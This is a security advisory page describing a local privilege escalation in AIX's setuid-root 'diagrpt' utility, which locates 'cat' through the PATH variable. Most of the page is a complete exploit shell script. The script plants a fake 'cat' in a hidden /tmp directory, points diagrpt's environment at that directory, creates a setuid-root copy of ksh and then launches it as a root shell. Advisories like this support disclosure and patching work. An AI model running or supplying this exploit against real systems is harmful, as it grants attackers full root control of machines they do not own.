source: https://www.securityfocus.com/bid/2916/info

AIX ships with a diagnostic reporting utility called 'diagrpt'. This utility is installed setuid root by default.

When 'diagrpt' executes, it relies on an environment variable to locate another utility which it executes. This utility is executed by 'diagrpt' as root.

An attacker can gain root privileges by having 'diagrpt' execute a malicious program of the same name in a directory under their control.

#!/bin/sh
# FileName: x_diagrpt.sh
# Exploit diagrpt of Aix4.x & 5L to get a uid=0 shell.
# Tested  : on Aix4.3.3 & Aix5.1.
# Author  : watercloud@xfocus.org
# Site    : www.xfocus.org   www.xfocus.net
# Date    : 2003-5-23
# Announce: use as your owner risk!
#
# Note    :
# It does not work on all versions of tsm command.
# Use this command to test if your version can exploit or not :
# bash$ strings /usr/lpp/diagnostics/bin/diagrpt |grep cat
# diagrpt.cat
# cat %s  <--- here ! have the bug !!! can exploit!
#

O_DIR=`/bin/pwd`
cd /tmp ; mkdir .ex$$ ; cd .ex$$
PATH=/tmp/.ex$$:$PATH ; export PATH
/bin/cat >cat<<EOF
#!/bin/ksh -p
cp /bin/ksh ./kfsh
chown root ./kfsh
chmod 777 ./kfsh
chmod u+s ./kfsh
EOF
chmod a+x cat

DIAGDATADIR=/tmp/.ex$$ ; export DIAGDATADIR
touch /tmp/.ex$$/diagrpt1.dat

/usr/lpp/diagnostics/bin/diagrpt -o 010101
stty echo
stty intr '^C' erase '^H' eof '^D' eol '^@'

if [ -e ./kfsh ] ;then
  echo ""
  echo "===================="
  pwd
  ls -l ./kfsh
  echo "Exploit ok ! Use this command to get a uid=0 shell :"
  echo '/usr/bin/syscall setreuid 0 0 \; execve "/bin/sh" '
  ./kfsh
else
  echo ""
  echo "Exploit false !!!!"
fi

cd /tmp ; /bin/rm  -Rf /tmp/.ex$$ ;cd $O_DIR
#EOF